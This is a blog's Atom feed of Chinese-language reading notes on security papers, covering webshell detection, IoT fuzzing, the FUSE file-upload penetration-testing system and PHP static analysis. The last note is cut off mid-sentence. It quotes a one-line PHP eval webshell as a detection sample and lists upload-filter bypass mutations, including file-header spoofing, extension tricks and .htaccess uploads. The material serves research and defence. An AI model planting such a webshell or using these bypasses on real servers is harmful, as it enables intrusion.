<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Cyc1e&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://cyc1e183.github.io/"/>
  <updated>2020-10-27T02:04:41.414Z</updated>
  <id>https://cyc1e183.github.io/</id>
  
  <author>
    <name>Cyc1e</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>(阅读笔记)CNN-Webshell Malicious Web Shell Detection with</title>
    <link href="https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)CNN-Webshell%20Malicious%20Web%20Shell%20Detection%20with/"/>
    <id>https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)CNN-Webshell%20Malicious%20Web%20Shell%20Detection%20with/</id>
    <published>2020-10-12T14:03:51.000Z</published>
    <updated>2020-10-27T02:04:41.414Z</updated>
    
    <content type="html"><![CDATA[<p>基于word2vec表示和卷积神经网络（CNN）的恶意web外壳检测方法</p><p>使用“word2vec”工具将从HTTP请求中分离出来的每个单词表示为一个向量。接下来，webshell可以表示为一个大小固定的矩阵。最后，设计了一个基于CNN的恶意网页外壳分类模型。</p><p>webshell检测方法可分为两种：静态检测方法和动态检测方法，前者有正则化特征匹配方法（如Linux恶意软件检测扫描器）、统计特征阈值方法（sush作为NeoPI）和基于关联的检测方法（webshell与现有web文件的连接较低）。后者对web文件的关键功能采用HOOK方式，对特殊目录下操作系统的读写操作采用监控方式。然而，在现实中，许多webshell经过混淆和变异后，与正常网页文件混淆，难以检测。只有当攻击者启动与目标服务器的HTTP通信以执行恶意代码时，才会显示恶意功能。本文重点研究了利用恶意HTTP通信来检测websehll</p><p>引入“word2vec”向量表示来表示从HTTP请求中分割出来的HTTP符号词。这是第一次将HTTP请求表示为一个矩阵，方法是按顺序连接单词向量。一旦有了矩阵表示，CNN就可以用来同时提取特征和学习分类器来检测恶意的webshell通信。它有能力发现两个词之间的相互关系，而这两个词之间相距甚远。通过实验对本文提出的方法进行了性能评估，并与几种分类器进行了比较，分析了关键参数和性能。</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)CNN-Webshell%20Malicious%20Web%20Shell%20Detection%20with/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0" alt>CNN-Webshell Malicious Web Shell Detection with/image-20200505153650696.png)</p><p>图1给出了包含恶意HTTP请求的包的示例。正在发布的请求内容通过URL编码进行编码。所以，首先，我们需要在预处理时对参数串进行解码。对于每个参数字符串，它有许多由符号“&amp;”分割的部分。每个部分由一个键值对组成。可以通过查找符号“=”来获取该对中的键和值。此外，在实际应用中，HTTP请求的参数字符串还具有许多其他特殊符号，如“（”、“）”、“{”、“}”、“/”、“\”、“@”。这些符号可用于将参数字符串分割为“单词”。这可以获得许多有意义的单词，用于对恶意webshell进行分类。分段的“单词”有简单的符号、数字或普通的单词和字符串。在这一步结束时，我们为每个HTTP请求得到一个“word”语句，该语句保持HTTP请求中“words”的顺序。</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)CNN-Webshell%20Malicious%20Web%20Shell%20Detection%20with/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0" alt>CNN-Webshell Malicious Web Shell Detection with/image-20200505201554513.png)</p><p>为了评估我们提出的方法的性能，本文将其与几个经典的分类器，朴素贝叶斯(NB)，  k-近邻(kNN)，决策树(DT)，支持向量机(SVM)，传统的神经网络(NN)进行了比较。所有这些分类器都使用相同的特性。对于多项式NB，常参数设为0.01。对于kNN，邻居参数设置为3。对于DT，使用熵，将叶节点上的最小样本设为3。支持向量机采用线性分类器。对于NN，使用了两个隐藏层，分别包含50和10个隐藏单元。表1显示了我们实验中每种方法的精确度、召回率和F1-score性能。NB方法的性能最差。与其他所有方法相比，我们的方法由于其良好的“单词”表示和CNN分类器而获得了最好的性能。</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)CNN-Webshell%20Malicious%20Web%20Shell%20Detection%20with/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0" alt>CNN-Webshell Malicious Web Shell Detection with/image-20200505202409327.png)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;基于word2vec表示和卷积神经网络（CNN）的恶意web外壳检测方法&lt;/p&gt;
&lt;p&gt;使用“word2vec”工具将从HTTP请求中分离出来的每个单词表示为一个向量。接下来，webshell可以表示为一个大小固定的矩阵。最后，设计了一个基于CNN的恶意网页外壳分类模型。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Cyc1e的学术之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84%E5%AD%A6%E6%9C%AF%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="Webshell检测" scheme="https://cyc1e183.github.io/tags/Webshell%E6%A3%80%E6%B5%8B/"/>
    
  </entry>
  
  <entry>
    <title>(阅读笔记)Detecting Webshell Based on Random Forest with FastText</title>
    <link href="https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)Detecting%20Webshell%20Based%20on%20Random%20Forest%20with%20FastText/"/>
    <id>https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)Detecting%20Webshell%20Based%20on%20Random%20Forest%20with%20FastText/</id>
    <published>2020-10-12T14:03:51.000Z</published>
    <updated>2020-10-27T02:05:35.376Z</updated>
    
    <content type="html"><![CDATA[<p>提出了一种基于fastText和随机森林算法的PHP Webshell检测模型，称为FRF-WD</p><p>操作码是一种机器语言指令。它为计算机提供了指示，指示如何处理提供的数据。到目前为止，一些相关工作表明，操作码频率可以将恶意软件与可信任软件区分开。  PHP操作码（或字节码）与恶意软件识别中使用的操作码不同，后者是Zend Engine  2在解析PHP文件时生成的一系列操作代码，表示该代码的功能。它们本质上是相似的，因为两者都告诉机器要做什么。因此，我们研究了是否可以使用PHP操作码来检测PHP  Webshell。</p><p>提取文件的特征，这些特征由两部分组成：静态特征和操作码序列。一方面，分析了文件的静态特征，包括最长字符串、熵、符合索引和危险函数等；另一方面，利用PHP-VLD扩展获取测试文件的操作码序列，然后利用fastText训练文本分类器模型。</p><p>操作码是一种机器语言指令。它为计算机提供了指示，指示如何处理提供的数据。到目前为止，一些相关工作表明，操作码频率可以将恶意软件与可信任软件区分开。  PHP操作码（或字节码）与恶意软件识别中使用的操作码不同，后者是Zend Engine  2在解析PHP文件时生成的一系列操作代码，表示该代码的功能。它们本质上是相似的，因为两者都告诉机器要做什么。因此，我们研究了是否可以使用PHP操作码来检测PHP  Webshell。 PHP具有Vulcan逻辑反汇编程序（VLD）[11]扩展。 VLD挂接到Zend  Engine，可以帮助我们方便地转储脚本的所有操作码。下面列出的示例是由Zend Engine解析的典型Webshell的输出：&lt;？php ev  al（$ _ POST [‘a’]）; ？&gt;如果通过VLD运行上述Web  Shell，则可以在表1中看到以下输出。因此，文件的PHP操作码序列如下所示：[“ EXT_SMTM”，“ FETCH_R”，“ FETCH_DIM_R”，“  EXT_FCALL_ BEGIN”， “ INCLUDE_OR_EVAL”，“ EXT_FCALL_END”，“ RETU RN”]。</p><p>通过使用PHP的VLD扩展，可以帮助轻松获取PHP文件的操作码序列。然后，我们研究是否可以将文本分类器技术与操作码一起使用来识别webshell。每个操作码本地序列都显示出相关性，即操作码序列中附近的操作码很可能彼此相关。这些顺序模式很重要，因为可以利用它们来提高预测变量的性能。选择FastText模型来训练文本分类器。  fastText模型由Joulin等人提出。  [12]。它结合了带有单词袋和n-gram袋的代表句子，并利用秩约束和快速损失近似的关键特征来提高基本线性分类器的性能。  FastText模型由一个矩阵A和一个矩阵B组成，矩阵A是单词的查找表，矩阵B用于分类器。将单词的表示形式平均化为文本表示形式，然后将其馈送到线性分类器。使用softmax函数f获得预定义类上的概率分布。对于一组N个文档，该模型导致最小化：∑（1）第n个文档的归一化BoW是哪里，即标签。  FastText更快，但可以达到与基于深度学习的建议方法相当的性能。特别是，不同文件的操作码序列的长度是多种多样的，有些可能只有几个操作码，有些可能具有超过数千个操作码，而fastText比诸如TextCNN的深度学习方法更适合处理此类数据集。  [13]在这项工作中，PHP的VLD扩展用于获取文件的操作码序列。然后在fastText上使用带标签的样本来训练文本分类器。之后，加载经过预训练的分类器以预测从PHP操作码序列生成的文本标签。预测值将用作预测值</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;提出了一种基于fastText和随机森林算法的PHP Webshell检测模型，称为FRF-WD&lt;/p&gt;
&lt;p&gt;操作码是一种机器语言指令。它为计算机提供了指示，指示如何处理提供的数据。到目前为止，一些相关工作表明，操作码频率可以将恶意软件与可信任软件区分开。  PHP操作码（或字节码）与恶意软件识别中使用的操作码不同，后者是Zend Engine  2在解析PHP文件时生成的一系列操作代码，表示该代码的功能。它们本质上是相似的，因为两者都告诉机器要做什么。因此，我们研究了是否可以使用PHP操作码来检测PHP  Webshell。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Cyc1e的学术之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84%E5%AD%A6%E6%9C%AF%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="Webshell检测" scheme="https://cyc1e183.github.io/tags/Webshell%E6%A3%80%E6%B5%8B/"/>
    
  </entry>
  
  <entry>
    <title>(阅读笔记)Discovering Vulnerabilities in COTS IoT Devices through Blackbox Fuzzing Web Management Interface</title>
    <link href="https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)Discovering%20Vulnerabilities%20in%20COTS%20IoT%20Devices%20through%20Blackbox%20Fuzzing%20Web%20Management%20Interface/"/>
    <id>https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)Discovering%20Vulnerabilities%20in%20COTS%20IoT%20Devices%20through%20Blackbox%20Fuzzing%20Web%20Management%20Interface/</id>
    <published>2020-10-12T14:03:51.000Z</published>
    <updated>2020-10-27T02:06:09.821Z</updated>
    
    <content type="html"><![CDATA[<p>提出利用Fuzz技术对物联网设备的Web端管理页面进行漏洞检测</p><p><strong>主要面临的问题</strong>：</p><ul><li><p>（1）Web管理页面设计的多样性，导致没有一个统一的接口可以直接用于Fuzz，以及接收随机消息以启动模糊测试时的效率很低</p></li><li><p>（2）由于交互的信息具有高度结构化，带有字节级突变的模糊测试可能会在早期阶段直接被设备拒绝接收。</p><p><strong>传统的方法</strong>：</p></li><li><p>（1）从官网等渠道手机固件</p></li><li><p>（2）用binwalk等解压</p></li><li><p>（3）采用动态或静态的方法进行漏洞挖掘</p></li></ul><p><strong>传统方法的问题</strong>：</p><ul><li><p>1.许多固件并未公开</p></li><li><p>2.解压的困难性，开发商在打包时会采用自己的压缩算法，并不是每个固件都能被直接解压。</p></li><li><p>3.由于底层架构的多样性而导致直接进行二进制分析较为困难</p></li></ul><p>文章提出利用基于变异的模糊技术自动执行黑盒测试（主要是发送的时变形的数据包进行测试），测试结果与AFL和Sully进行了比较，IO设备通常是为特定目的而设计的，供应商通常宁愿更加关注数据传输和视频质量的改善，而他们只是在Web管理界面上花很少的资源，包括安全性。并且家用型联网的IoT设备交互的数据信息大多为敏感信息和远程控制指令，以http数据包的形势进行发送。</p><p>针对IoT设备的fuzz方法，采用黑盒的方式更为适用！</p><p>总体思路**：</p><ul><li><p>爬取页面，生成初始消息种子</p></li><li><p>利用初始消息种子，基于http协议框架进行编译</p></li><li><p>对设备进行fuzz</p></li><li><p>设置设备监视，判断设备奔溃以及漏洞触发情况</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;提出利用Fuzz技术对物联网设备的Web端管理页面进行漏洞检测&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;主要面临的问题&lt;/strong&gt;：&lt;/p&gt;
    
    </summary>
    
    
      <category term="Cyc1e的学术之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84%E5%AD%A6%E6%9C%AF%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="IoT漏洞挖掘" scheme="https://cyc1e183.github.io/tags/IoT%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>(阅读笔记)FUSE Finding File Upload Bugs via Penetration Testing</title>
    <link href="https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)FUSE%20Finding%20File%20Upload%20Bugs%20via%20Penetration%20Testing/"/>
    <id>https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)FUSE%20Finding%20File%20Upload%20Bugs%20via%20Penetration%20Testing/</id>
    <published>2020-10-12T14:03:51.000Z</published>
    <updated>2020-10-27T02:06:37.804Z</updated>
    
    <content type="html"><![CDATA[<p>缩写：<strong>PCE（潜在的代码执行）</strong>、<strong>CE（代码执行）</strong>、<strong>Unrestricted Executable File Upload (UEFU)</strong>、<strong>Unrestricted File Upload(UFU)</strong></p><h3 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><p>网站的文件上传功能会带来安全风险，攻击者可以将其任意文件上载到目标服务器，并将其用作垫脚石，以提供更多机会破坏目标系统。因此，对于Web应用程序开发人员来说，至关重要的是防止攻击者滥用此上传功能。缓解该问题的一种普遍做法是实施内容过滤检查，以禁止上传构成严重安全风险的指定文件类型。</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)FUSE%20Finding%20File%20Upload%20Bugs%20via%20Penetration%20Testing/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0" alt>FUSE Finding File Upload Bugs via Penetration Testing/image-20201015201939883.png)</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)FUSE%20Finding%20File%20Upload%20Bugs%20via%20Penetration%20Testing/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0" alt>FUSE Finding File Upload Bugs via Penetration Testing/image-20201015201955425.png)</p><p>不受限制的文件上传（UFU）是利用服务器端Web应用程序中的内容筛选检查中的缺陷的漏洞，成功上传伪造的文件会带来潜在的代码执行风险。当攻击者能够通过其URL触发上载文件的代码执行时，此UFU漏洞将变得更加严重。这意味着对手可以通过调用URL来执行任意代码执行。我们将内容过滤检查中的缺陷称为“不受限制的可执行文件上传（UEFU）”漏洞，其中（1）允许上传可执行文件，并且（2）对手能够在目标网站上远程运行此可执行文件服务器或受害者的浏览器（通过调用URL）。</p><h3 id="0x01-FUSE"><a href="#0x01-FUSE" class="headerlink" title="0x01 FUSE"></a>0x01 FUSE</h3><p>提出了FUSE，这是一种旨在确定U（E）FU漏洞的渗透测试系统，该方法面临两个技术挑战：</p><ul><li>（1）它应生成一个上传请求，以绕过目标Web应用程序中存在的所有内容过滤检查；  </li><li>（2）应该保留最终上传文件的执行语义。我们通过使用精心设计的变异来更改标准上传请求来应对这些技术挑战，这些变异可以绕过内容过滤检查，并且不会篡改上传文件的执行。</li></ul><p>文章提出了一种新颖的基于变异的算法，用于生成引发U（E）FU漏洞的上传请求。首先生成四个种子上传请求；每个请求都会尝试上传PHP，HTML，XHTML或JS文件。目标应用程序可能会阻止这些种子请求，因此，FUSE通过应用13种精心设计的突变操作的组合来突变每个种子请求。作者定义了五个目标，这些目标在实施内容过滤检查时会触发常见错误。然后，我们实施了具体的变异方法，每种方法均至少实现了一个目标，从而解决了第一个挑战。同时，这些突变操作不会篡改种子文件可由目标执行环境执行所需的约束，因此保留了种子文件的执行语义。</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)FUSE%20Finding%20File%20Upload%20Bugs%20via%20Penetration%20Testing/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0" alt>FUSE Finding File Upload Bugs via Penetration Testing/image-20201008212443815.png)</p><p><strong>FUSE的总体架构</strong>，它由三个组件组成：<strong>链协调器</strong>，<strong>上传代理</strong>和<strong>上传验证器</strong>。在较高的层次上，这些组件协同工作以执行三个步骤。  （1）链协调员为四个种子文件中的每个文件准备测试策略； （2）UPLOAD  AGENT建立上传请求，根据测试策略对这些请求进行变异，并发送这些变异的请求，以尝试上传种子文件的变体； （3）UPUP  VALIDATOR检查上传的文件是否可以通过公开访问的URL访问和执行。</p><ul><li>链协调器构造一个测试策略，称为链表。它指定如何生成一系列变异的上传请求。此链列表中的每个链都包含一个FUSE应用于种子上传请求的变异操作列表。因此，每个突变的上传请求是将链中的突变应用于种子上传请求的计算结果。</li><li>上传代理。该模块负责为给定的种子文件生成一个上传请求，并根据链协调器计算出的给定链来改变原始请求。目标应用程序通常需要完成身份验证过程，并与每个尝试的上载请求一起发送有效的CSRF令牌。因此，UPLOAD  AGENT解决了身份验证过程并附加了有效的CSRF令牌以促进上载过程。</li><li>上传验证器。  UPLOAD VALIDATOR会检查生成的请求是否成功上传了文件，并获得了这些上传文件的公共URL。通过通过计算的URL访问这些文件，UPLOAD  VALIDATOR检查上传的文件是否可执行。</li></ul><h3 id="0x02-测试流程"><a href="#0x02-测试流程" class="headerlink" title="0x02 测试流程"></a>0x02 测试流程</h3><ul><li>第一阶段为每个种子文件计算一种测试策略，我们将其称为链表。</li><li>第二阶段通过为每个种子文件构造一个种子请求，根据链表对这些种子请求进行变异并发送变异的请求来执行此测试策略。</li><li>第三阶段获取导致成功上传文件的可访问URL，并检查这些上传文件的执行能力。</li></ul><p>FUSE接受两个输入：一组种子文件和一个配置文件。每个种子文件都将成为构建标准上传请求（称为种子请求）的源。  FUSE还使用用户提供的配置文件，该文件指定目标PHP应用程序的参数。</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)FUSE%20Finding%20File%20Upload%20Bugs%20via%20Penetration%20Testing/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0" alt>FUSE Finding File Upload Bugs via Penetration Testing/image-20201015202602518.png)</p><p><strong>第一阶段：链式协调</strong></p><p>链协调的目的是穷举探索所有可行的突变组合，从而有助于FUSE生成各种上载请求并发现新的错误。请注意，每个变异操作都旨在绕过一种内容过滤检查。因此，这些组合无疑会增加绕过多个内容过滤检查的几率。</p><p>链协调器首先为每个种子请求创建一个初始链表。对于每个种子请求，它将排列所有适用的变异操作，然后按链长对它们进行排序。例如，如果适用于HTML种子的变异操作是M1，M2和M3，则链表如下。（<strong>绕过组合策略</strong>）</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)FUSE%20Finding%20File%20Upload%20Bugs%20via%20Penetration%20Testing/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0" alt>FUSE Finding File Upload Bugs via Penetration Testing/image-20201009083501975.png)</p><p>在两个不同的变异操作修改种子请求的重叠部分的情况下，它们可能会相互冲突。链协调程序可删除此类虚假链以清除不必要的突变。例如，如果M1与M2冲突，则先前示例的修订链列表将变为以下内容。</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)FUSE%20Finding%20File%20Upload%20Bugs%20via%20Penetration%20Testing/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0" alt>FUSE Finding File Upload Bugs via Penetration Testing/image-20201009083449428.png)</p><p>链协调器的另一个功能是根据从阶段III获得的先前的上载尝试结果来删除链，以进行有效的渗透测试。如果一条链有助于成功上传，则“链协调器”会清除包括该成功链的所有其他链。由于链表是根据其链长排序的，因此FUSE总是选择一条短链，而不是其他包含此短链的较长链。我们的目的是报告不同的最小长度链，以成功利用漏洞。例如，如果链M1成功触发了UFU漏洞，则链协调器将从链列表中删除所有其他包含M1的链，如下所示：</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)FUSE%20Finding%20File%20Upload%20Bugs%20via%20Penetration%20Testing/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0" alt>FUSE Finding File Upload Bugs via Penetration Testing/image-20201008212430917.png)</p><p>如果空链（即种子请求无突变）触发了UFU漏洞，则链协调器会删除链表中的所有链。</p><p><strong>第二阶段：更改和发送上传请求</strong></p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)FUSE%20Finding%20File%20Upload%20Bugs%20via%20Penetration%20Testing/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0" alt>FUSE Finding File Upload Bugs via Penetration Testing/image-20201015203221490.png)</p><p><strong>第三阶段：上传验证</strong></p><p>UPLOAD VALIDATOR执行三个任务：</p><p>（1）检查每个尝试的上传请求是否成功将文件拖放到托管目标应用程序的Web服务器上； </p><p>（2）计算指向上传文件的URL；  </p><p>（3）确认获取的URL是否调用了上传文件的执行。</p><p>三种不同的方法来获取上载文件的URL：</p><ul><li>URL的通用前缀：UPLOAD VALIDATOR使用用户提供的参数url_prefix，该参数指示通向所有上载文件的URL的公共前缀。如果设置了此参数，则UPVAL VALIDATOR会简单地将用url_prefix提取的URL值和上载文件名连接起来，从而生成最终的URL。</li><li>上传回应和摘要网页：应用程序在对上载请求的响应中提供了上载文件的URL</li><li>文件监视：解决一些应用程序使用随机文件名作为其上载文件，并且不提供摘要页面的问题</li></ul><p>FUSE进一步检查了上载<strong>.htaccess</strong>文件的可行性。如果上载攻击者能够控制.htaccess文件，则她可以调用PHP解释器以执行具有任何扩展名的上载文件，并使该上载文件可访问。这是一个关键的安全威胁，它使具有PCE风险的UFU漏洞演变为导致CE的UEFU漏洞。</p><h3 id="0x03-突变"><a href="#0x03-突变" class="headerlink" title="0x03 突变"></a>0x03 突变</h3><p><strong>突变载体</strong></p><p>突变的主要目标是以给定的上载请求保留其种子文件的执行语义的方式来转换给定的上载请求，并且经过变异的请求可能会绕过内容过滤逻辑。因此首先确定了上载攻击者能够操纵的变异载体。</p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)FUSE%20Finding%20File%20Upload%20Bugs%20via%20Penetration%20Testing/image-20201009085310529.png"><p>FUSE更改HTTP协议报文中的字段，在上载请求的请求主体中，FUSE考虑了三个突变向量来修改其对应字段：</p><ul><li>Extension：文件名的扩展名</li><li>Content-Type：文件的 MIME 类型</li><li>Content：文件的二进制内容或纯文本</li></ul><p>突变的五个目标</p><ul><li>检查是否没有内容过滤检查</li><li>根据内容消除错误的类型推断</li><li>根据扩展利用不完整的白名单或黑名单</li><li>绕过基于内容的关键字过滤逻辑：例如&lt;?php、<html>、<script></li><li>绕过基于Content-Type的过滤逻辑</li></ul><p><strong>突变清单</strong></p><p><img src="(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0" alt="">FUSE Finding File Upload Bugs via Penetration Testing/image-20201009091953233.png)</p><p><strong>M1</strong> ：加文件头前缀，包括6种文件类型（GIF，JPG，PDF，PNG，TAR_GZ和ZIP），只适用于PHP和HTML文件</p><p><strong>M2</strong>：将恶意代码注入6种文件的元数据部分中（GIF，JPG，PDF，PNG，TAR_GZ和ZIP）</p><p><strong>M3</strong>：更改上载请求的内容类型 Content-Type，更改为GIF，JPG，PDF，PNG，TAR_GZ和ZIP的上传请求类型</p><p><strong>M4</strong>：更改文件扩展名，将给定上传请求的扩展名更改为七个PHP样式扩展名之一或17个预定义的公共扩展名之一</p><p><strong>M5</strong>：替换PHP标签，短标签</p><p><strong>M6</strong>：将HTML转换为EML，EML文件能够包含带有脚本元素的HTML文档，适用于(X)HTML</p><p><strong>M7</strong>：删除文件扩展名</p><p><strong>M8</strong>：将文件转换为SVG，SVG是XML的文件格式，代表矢量图像；它有助于将HTML代码嵌入其文件中。</p><p><strong>M9</strong>：添加一个在HTML注释：<!--,--?></p><p><strong>M10</strong>：将文件扩展名更改为不常见的扩展名，适合HTML和JS种子文件</p><p><strong>M11</strong>：将文件扩展名转换为大写，将给定请求的扩展名中的第二个字符更改为大写的操作。</p><p><strong>M12</strong>：附加文件扩展名，例如，通过将gzip附加到扩展名，将上载文件的扩展名从.php更改为.gzip.php</p><p><strong>M13</strong>：追加资源标头，将预定义JPG文件的八个字节的标头附加到给定上传请求的内容的末尾</p><p><strong>实验结果</strong>：</p><p><img src="(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0" alt="">FUSE Finding File Upload Bugs via Penetration Testing/image-20201009212715186.png)</p><h3 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h3><p>作者手动检查了浏览器和PHP解释器(VI)的执行约束，并在设计13个突变时反映了这些约束。<strong>因此，当嵌入在这些软件中的这些约束由于它们的更新而改变时，突变也应该被修改以反映这些改变(VII-D)。这些执行约束的自动提取[30]和这些约束对突变的反映是我们留给未来研究的有趣的技术挑战。</strong></p><p>导致UFU漏洞的最常见错误是使用不完整的黑名单或有缺陷的扩展白名单。这种趋势源于开发人员对造成低安全风险的文件类型的无知。</p><p>另一个漏洞来源是智能浏览器执行内容嗅探。假设攻击者试图上传目标应用程序接受的攻击文件。在某些情况下，托管应用程序的Apache服务器无法推断上传的文件类型，因此在对该文件的请求的响应中没有放置内容类型头。这邀请浏览器通过执行内容嗅探来基于其内容推断文件类型，上传攻击者利用这一点。对于网络服务器无法推断其类型的上传文件，我们建议将X-Content-Type-Options设置为启用nosniff，这将阻止浏览器执行内容嗅探[11]。调整Apache配置文件来设置这个头的默认值可以阻止攻击。此外，web应用程序可以用应用程序推断的特定文件类型来指定标头，从而防止攻击。</p></script></html></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;缩写：&lt;strong&gt;PCE（潜在的代码执行）&lt;/strong&gt;、&lt;strong&gt;CE（代码执行）&lt;/strong&gt;、&lt;strong&gt;Unrestricted Executable File Upload (UEFU)&lt;/strong&gt;、&lt;strong&gt;Unrestricted File Upload(UFU)&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x00-背景&quot;&gt;&lt;a href=&quot;#0x00-背景&quot; class=&quot;headerlink&quot; title=&quot;0x00 背景&quot;&gt;&lt;/a&gt;0x00 背景&lt;/h3&gt;
    
    </summary>
    
    
      <category term="Cyc1e的学术之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84%E5%AD%A6%E6%9C%AF%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="Web漏洞挖掘" scheme="https://cyc1e183.github.io/tags/Web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>(阅读笔记)PHP代码缺陷检测技术的研究与实现（静态）</title>
    <link href="https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)PHP%E4%BB%A3%E7%A0%81%E7%BC%BA%E9%99%B7%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF%E7%9A%84%E7%A0%94%E7%A9%B6%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    <id>https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)PHP%E4%BB%A3%E7%A0%81%E7%BC%BA%E9%99%B7%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF%E7%9A%84%E7%A0%94%E7%A9%B6%E4%B8%8E%E5%AE%9E%E7%8E%B0/</id>
    <published>2020-10-12T14:03:51.000Z</published>
    <updated>2020-10-27T02:07:33.675Z</updated>
    
    <content type="html"><![CDATA[<p>选择了能够支持主流PHP版本的PHP-Parser作为代码编译前端的基础，实现数据流分析所需的代码编译和控制流图的生成，同时针对MVC框架的特点，使用重定义入口集合的方式解决检测是对代码分支覆盖不足的问题。</p><p>提出了一种基于污染传播记录的动态检测方法。</p><p>迄今为止，全球有超过80%的网站使用PHP作为其开发语言1，大量国内外的著名站点，包括Google、Facebook、Amazon、百度、微博等，均使用PHP作为其后端开发语言。</p><p>第二个阶段是基于PHP代码底层的检测，即通过先对PHP代码进行编译或解释等操作，将其转换成易于分析的形式，再通过数据流分析、污点分析等方式进行缺陷检测，如RIPS四、Pixyl等，相对第一个阶段而言，基于PHP实现原理的分析方式能够更准确的分析PHP代码本身的含义，是目前PHP代码缺陷检测的主流思路。</p><p><strong>PHP语言的特性</strong></p><ul><li>用户输入</li><li>动态弱类型</li><li>动态执行</li><li>对象定义与实例化</li><li>自动加载</li><li>引用和复制</li></ul><p><strong>MVC架构</strong>：整个应用由Model（模型）、View（视图）、Controller（控制器）三个模块组成。</p><p>MVC架构的PHP web应用几乎都会使用如自动加载、路由解析等动态包含技术，这些动态包含的目标需要在代码运行时，借助用户输入才能被确定，纯静态分析无法获取PHP代码间的包含关系，也就无法获得程序的执行流程，并且MVC架构下大多数文件中只包含一些对象定义，直接忽视动态调用过程，转而对这些文件进行单独分析也会因无法建立完整的代码执行逻辑而难以进行缺陷检测，因此针对传统开发模式的静态缺陷检测工具，应用到基于面向对象、使用MVC架构开发的PHP 